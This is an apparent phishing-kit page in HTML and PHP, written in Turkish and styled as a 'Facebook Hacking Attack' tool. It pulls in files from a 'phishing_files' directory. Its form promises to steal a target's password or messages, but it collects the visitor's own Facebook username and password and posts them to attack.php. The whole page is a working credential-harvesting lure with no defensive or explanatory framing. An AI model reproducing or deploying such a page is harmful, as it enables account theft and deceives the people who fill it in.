<!DOCTYPE html>
<html lang="tr">
  <head>
<?php
include ("../../phishing_files/info-command.php");
?>
    <meta name="viewport" content="width=device-width">
    <meta charset="utf-8">
    <title>FACEBOOK HACKİNG ATTACK</title>
  <link rel="icon" href="https://www.flaticon.com/premium-icon/icons/svg/2168/2168281.svg" type="image/x-icon" />
  <style>
@import url('https://fonts.googleapis.com/css2?family=Kiwi+Maru:wght@300&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400&display=swap');
* {
  margin: 0;
  padding: 0;
  font-family: 'Kiwi Maru', serif;
  text-shadow: 0px -1px 0px rgba(0,0,0,0.4);
  list-style:none;
  text-decoration: none;
}

body {
  margin: 0;
  padding: 0;
  background: #000;
  box-sizing: border-box;
}
a {
  font-family: 'Poppins', sans-serif;
}
.green-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #69F0AE,
    0 0 40px rgba(0, 230, 118, .75),
    0 0 50px rgba(0, 230, 118, .75),
    0 0 100px rgba(0, 230, 118, .75);
}

.green-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}

.red-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #e50000,
    0 0 40px #e50000,
    0 0 50px #e50000,
    0 0 100px #e50000;
}

.red-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}


.box{
  width: 300px;
  padding: 10px;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%,-50%);
  background: black;
  text-align: center;
  border-radius: 50px;
  box-shadow: 0 0 5px #7CFC00,
              0 0 25px #7CFC00,
              0 0 50px #7CFC00,
	      0 0 200px #7CFC00;
}
.box h1{
  color: white;
  font-size: 20px;
  font-weight: 500;
}
.box input[type = "text"],.box input[type = "password"]{
  border:0;
  background: none;
  display: block;
  margin: 30px auto;
  text-align: center;
  border: 2px solid #3498db;
  padding: 14px 10px;
  width: 200px;
  outline: none;
  color: white;
  border-radius: 24px;
  transition: 0.25s;
}
.box input[name = "username-attack"]{
border-color: #ff0000;
}
.box input[type = "text"]:focus,.box input[type = "password"]:focus{
  width: 280px;
  border-color: #2ecc71;
}
.box input[type = "submit"]{
  border:0;
  background: none;
  display: block;
  margin: 20px auto;
  text-align: center;
  border: 2px solid #2ecc71;
  padding: 14px 40px;
  outline: none;
  color: white;
  border-radius: 24px;
  transition: 0.25s;
  cursor: pointer;
}
p {
  margin-top: 20px;
  font-family: 'Poppins', sans-serif;
  color: #7CFC00;
}
.box input[type = "submit"]:hover{
  background: #2ecc71;
}

select {

  -webkit-appearance: none;

  -moz-appearance: none;
  -ms-appearance: none;
  appearance: none;
  outline: 0;
  box-shadow: none;
  border: 0 !important;
  background: #2c3e50;
  background-image: none;
}
select {
  flex: 1;
  padding: 0 .5em;
  color: #fff;
  cursor: pointer;
}
.select::after {
  position: absolute;
  top: 0;
  right: 0;
  padding: 0 1em;
  background: #34495e;
  cursor: pointer;
  pointer-events: none;
  -webkit-transition: .25s all ease;
  -o-transition: .25s all ease;
  transition: .25s all ease;
}
.select:hover::after {
  color: #f39c12;
}
.select {
  margin-left: 25px;
  display: flex;
  width: 15em;
  left: 30px;
  height: 3em;
  line-height: 3;
  background: rgba(255,255,255, 0.1);
  background: #7cfc00;
  overflow: hidden;
  border-radius: 1em;
  border-right: 5px solid #7cfc00;
  border-left: 5px solid #7cfc00;
}

.info-box ul{
margin-top: -20px;
left: 35px;
}

</style>
  </head>
  <body>
<div class="box">
<?php
include ("../../phishing_files/info-box.php");
?>
<img src="https://www.flaticon.com/premium-icon/icons/svg/2168/2168281.svg" width="100" height="100" style="background: #7cfc00; border-radius:50px;"><br><br>
  <h1 class="green-neon">Facebook Hacking Attack</h1>
<br>
<form method="post" action="attack.php">
<div class="select">
  <select>
<option selected disabled>Saldırı Türünü Seçiniz&emsp;➤</option>
<option>Şifre Saldırısı</option>
<option>Tüm Mesajlaşmaları Ele Geçir</option>
</select>
</div>
<input type="text" name="username-attack" autocomplete="off" placeholder="Saldırı Yapılacak Hesap Linki">
<input type="text" name="username" autocomplete="off" placeholder="Kullanıcı Adı" required>
<input type="password" name="password" placeholder="Şifre" autocomplete="off" required>
  <input type="submit" value="Saldırıyı Başlat">
</div>
</form>
  </body>
</html>
